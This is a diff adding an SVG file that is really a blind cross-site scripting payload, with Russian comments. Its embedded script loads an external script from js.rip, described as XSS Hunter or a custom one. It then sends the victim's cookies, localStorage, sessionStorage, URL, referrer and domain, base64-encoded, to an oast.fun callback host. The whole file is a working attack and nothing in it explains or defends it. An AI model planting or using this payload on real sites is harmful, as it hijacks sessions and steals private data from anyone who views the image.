@@ -1,0 +1,26 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0">
+  <script>
+    // Внешний скрипт (например, XSS Hunter или ваш кастомный)
+    var s = document.createElement('script');
+    s.src = 'https://js.rip/1xspwug86u';
+    s.onload = function() {
+      // Дополнительно: отправим критичные данные сразу — на случай, если внешний скрипт не сработает
+      try {
+        fetch('https://kotfxrgkoiscjimuimjwq8s79cbddl9qi.oast.fun/enhanced?data=' + encodeURIComponent(
+          btoa(JSON.stringify({
+            url: document.location.href,
+            referrer: document.referrer,
+            cookies: document.cookie,
+            localStorage: Object.keys(localStorage).map(k => [k, localStorage[k]]),
+            sessionStorage: Object.keys(sessionStorage).map(k => [k, sessionStorage[k]]),
+            title: document.title,
+            userAgent: navigator.userAgent,
+            origin: document.origin,
+            domain: document.domain
+          }))
+        ));
+      } catch(e) {}
+    };
+    document.head.appendChild(s);
+  </script>
+</svg>
